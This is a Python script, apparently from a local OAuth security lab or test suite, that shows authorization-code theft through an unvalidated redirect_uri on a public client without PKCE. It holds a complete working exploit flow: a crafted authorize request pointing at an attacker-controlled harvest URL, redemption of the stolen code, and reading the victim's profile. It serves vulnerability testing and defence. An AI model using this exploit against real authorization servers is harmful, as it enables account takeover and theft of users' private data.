"""
attack1_redirect_uri.py
=======================
Root cause: the Authorization Server does not validate `redirect_uri`
against the value registered for the client (RFC 9700 sec 4.1).

Scenario (public client `spa`):
  1. Victim 'alice' is authenticated to the AS.
  2. Attacker lures alice to an authorize URL whose redirect_uri points at
     attacker-controlled http://localhost:6666/harvest.
  3. The AS happily issues a code and 302-redirects it to the attacker URL.
     (We read it straight from the Location header -- exactly what the
     attacker's server would receive.)
  4. Attacker redeems the code at /token. The client is public (no secret)
     and there is no PKCE, so nothing stops them.
  5. Attacker spends the access token at the resource server and reads
     alice's private account data.

SUCCESS = attacker obtains alice's sensitive data.
"""
import os, re, requests

AS = os.environ.get("AS", "http://localhost:5000")
RS = os.environ.get("RS", "http://localhost:5002")
EVIL = "http://localhost:6666/harvest"   # attacker-controlled


def attack():
    victim = requests.Session()
    victim.post(f"{AS}/login", data={"username": "alice", "password": "alicepw"},
                allow_redirects=False)

    # attacker-crafted authorization request with a hostile redirect_uri
    r = victim.get(f"{AS}/authorize", params={
        "response_type": "code", "client_id": "spa",
        "redirect_uri": EVIL, "scope": "openid", "_consent": "yes",
    }, allow_redirects=False)

    loc = r.headers.get("Location", "")
    if EVIL not in loc:
        return False, f"AS refused hostile redirect_uri (good). Location={loc[:80]}"
    code = re.search(r"code=([^&]+)", loc).group(1)

    # attacker redeems the harvested code (public client, no secret, no PKCE)
    tok = requests.post(f"{AS}/token", data={
        "grant_type": "authorization_code", "code": code,
        "client_id": "spa", "redirect_uri": EVIL,
    }).json()
    if "access_token" not in tok:
        return False, f"token endpoint rejected harvested code (good): {tok}"

    prof = requests.get(f"{RS}/api/profile",
                        headers={"Authorization": "Bearer " + tok["access_token"]}).json()
    if prof.get("username") == "alice":
        return True, f"STOLE alice's data via attacker redirect_uri: {prof}"
    return False, f"resource access failed: {prof}"


if __name__ == "__main__":
    ok, detail = attack()
    print(("[VULNERABLE] " if ok else "[BLOCKED] ") + detail)
